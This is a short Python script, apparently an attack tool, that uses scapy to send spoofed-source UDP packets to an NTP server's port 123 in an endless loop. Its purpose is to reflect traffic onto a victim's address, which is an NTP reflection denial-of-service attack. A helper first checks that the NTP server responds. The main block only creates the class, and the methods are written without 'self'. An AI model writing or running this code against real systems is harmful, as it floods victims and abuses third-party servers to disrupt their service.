from scapy.all import *
import ntplib
import random

class Ntp:
    def check_ntp(ntp_server):
        ntp = ntplib.NTPClient()
        try:
            c = ntp.request(ntp_server, version=3)
            return True
        except:
            print("Ntp is closed, exiting...")
            exit()
    
    def dos_ntp(target, dst_server, data):
        packet_format = IP(dst=dst_server, src=target)/UDP(sport=random.randint(3000, 43987), dport=123)/Raw(load=data)
        send(packet_format, loop=1)
        

if __name__ == "__main__":
    Ntp()